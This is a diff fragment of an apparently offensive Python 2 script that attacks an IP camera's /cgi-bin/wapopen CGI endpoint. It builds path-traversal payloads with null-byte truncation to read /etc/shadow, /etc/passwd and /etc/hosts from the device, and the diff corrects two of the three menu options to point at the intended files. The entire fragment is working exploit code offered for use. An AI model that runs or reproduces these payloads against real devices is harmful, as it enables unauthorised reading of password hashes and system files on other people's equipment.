@@ -11,9 +11,9 @@ file_choice=raw_input ("Please choose a number representing the file to attack: 
 if file_choice == "1":
     payload="/cgi-bin/wapopen?B1=OK&NO=CAM_16&REFRESH_TIME=Auto_00&FILECAMERA=../../etc/shadow%00&REFRESH_HTML=auto.htm&ONLOAD_HTML=onload.htm&STREAMING_HTML=streaming.htm&NAME=malice&PWD=malice&PIC_SIZE=0"
 elif file_choice == "2":
-    payload="/cgi-bin/wapopen?B1=OK&NO=CAM_16&REFRESH_TIME=Auto_00&FILECAMERA=../../etc/shadow%00&REFRESH_HTML=auto.htm&ONLOAD_HTML=onload.htm&STREAMING_HTML=streaming.htm&NAME=malice&PWD=malice&PIC_SIZE=0"
+    payload="/cgi-bin/wapopen?B1=OK&NO=CAM_16&REFRESH_TIME=Auto_00&FILECAMERA=../../etc/passwd%00&REFRESH_HTML=auto.htm&ONLOAD_HTML=onload.htm&STREAMING_HTML=streaming.htm&NAME=malice&PWD=malice&PIC_SIZE=0"
 elif file_choice == "3":
-    payload="/cgi-bin/wapopen?B1=OK&NO=CAM_16&REFRESH_TIME=Auto_00&FILECAMERA=../../etc/shadow%00&REFRESH_HTML=auto.htm&ONLOAD_HTML=onload.htm&STREAMING_HTML=streaming.htm&NAME=malice&PWD=malice&PIC_SIZE=0"
+    payload="/cgi-bin/wapopen?B1=OK&NO=CAM_16&REFRESH_TIME=Auto_00&FILECAMERA=../../etc/hosts%00&REFRESH_HTML=auto.htm&ONLOAD_HTML=onload.htm&STREAMING_HTML=streaming.htm&NAME=malice&PWD=malice&PIC_SIZE=0"
 else:
     print "Invalid Download choice, Please choose 1 ,2 or 3; Alternatively you can re-code me; I will now exit"
     quit()  
